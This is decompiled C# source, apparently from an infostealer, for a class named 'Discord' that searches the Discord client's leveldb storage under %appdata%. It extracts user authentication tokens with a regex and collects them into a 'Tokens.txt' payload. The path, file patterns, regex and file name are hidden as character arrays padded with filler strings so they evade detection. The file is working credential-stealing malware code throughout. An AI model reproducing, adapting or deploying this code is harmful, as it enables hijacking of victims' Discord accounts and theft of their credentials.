using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;

// Token: 0x02000017 RID: 23
public class Discord : Extractor
{
	// Token: 0x06000098 RID: 152 RVA: 0x00007894 File Offset: 0x00005C94
	public override string Id2(Entity16 scannerArg, FileInfo fileInfo)
	{
		return string.Empty;
	}

	// Token: 0x06000099 RID: 153 RVA: 0x000078AC File Offset: 0x00005CAC
	public override IEnumerable<Entity16> Id3()
	{
		List<Entity16> list = new List<Entity16>();
		try
		{
			string id = Environment.ExpandEnvironmentVariables(new string(new char[]
			{
				'%',
				'a',
				'p',
				'p',
				'd',
				'a',
				't',
				'a',
				'%',
				'\\',
				'd',
				'i',
				's',
				'c',
				'o',
				'r',
				'd',
				'\\',
				'L',
				'o',
				'c',
				'a',
				'l',
				' ',
				'S',
				't',
				'o',
				'r',
				'a',
				'g',
				'e',
				'\\',
				'l',
				'e',
				'v',
				'e',
				'l',
				'd',
				'b'
			}));
			list.Add(new Entity16
			{
				Id1 = id,
				Id2 = new string(new char[]
				{
					'-',
					'*',
					'.',
					'l',
					'o',
					'-',
					'-',
					'g'
				}).Replace("-", string.Empty),
				Id3 = false
			});
			list.Add(new Entity16
			{
				Id1 = id,
				Id2 = new string(new char[]
				{
					'1',
					'*',
					'.',
					'1',
					'l',
					'1',
					'd',
					'1',
					'b'
				}).Replace("1", string.Empty),
				Id3 = false
			});
		}
		catch
		{
		}
		return list;
	}

	// Token: 0x0600009A RID: 154 RVA: 0x00007990 File Offset: 0x00005D90
	public static IEnumerable<Entity5> GetTokens()
	{
		List<Entity5> scannedfiles = FileScanning.Search(new Extractor[]
		{
			new Discord()
		});
		StringBuilder tokens = new StringBuilder();
		foreach (Entity5 file in scannedfiles)
		{
			try
			{
				foreach (object obj in Regex.Matches(Encoding.UTF8.GetString(file.Id3), new string(new char[]
				{
					'[',
					'A',
					'S',
					't',
					'r',
					'i',
					'n',
					'g',
					'-',
					'Z',
					'a',
					'S',
					't',
					'r',
					'i',
					'n',
					'g',
					'-',
					'z',
					'\\',
					'd',
					']',
					'{',
					'2',
					'S',
					't',
					'r',
					'i',
					'n',
					'g',
					'4',
					'}',
					'\\',
					'.',
					'[',
					'S',
					't',
					'r',
					'i',
					'n',
					'g',
					'\\',
					'w',
					'-',
					']',
					'{',
					'S',
					't',
					'r',
					'i',
					'n',
					'g',
					'6',
					'}',
					'\\',
					'.',
					'[',
					'\\',
					'w',
					'S',
					't',
					'r',
					'i',
					'n',
					'g',
					'-',
					']',
					'{',
					'2',
					'S',
					't',
					'r',
					'i',
					'n',
					'g',
					'7',
					'}'
				}).Replace("String", string.Empty)))
				{
					Match match = (Match)obj;
					try
					{
						string token = match.ToString().Trim();
						bool flag = !tokens.ToString().Contains(token);
						if (flag)
						{
							tokens.AppendLine(token);
						}
						token = null;
					}
					catch
					{
					}
					match = null;
				}
				IEnumerator enumerator2 = null;
			}
			catch
			{
			}
			file = null;
		}
		List<Entity5>.Enumerator enumerator = default(List<Entity5>.Enumerator);
		yield return new Entity5
		{
			Id3 = Encoding.ASCII.GetBytes(tokens.ToString()),
			Id1 = new string(new char[]
			{
				'T',
				'R',
				'e',
				'p',
				'l',
				'a',
				'c',
				'e',
				'o',
				'k',
				'R',
				'e',
				'p',
				'l',
				'a',
				'c',
				'e',
				'e',
				'n',
				'R',
				'e',
				'p',
				'l',
				'a',
				'c',
				'e',
				's',
				'.',
				't',
				'R',
				'e',
				'p',
				'l',
				'a',
				'c',
				'e',
				'x',
				't'
			}).Replace("Replace", string.Empty)
		};
		yield break;
	}
}
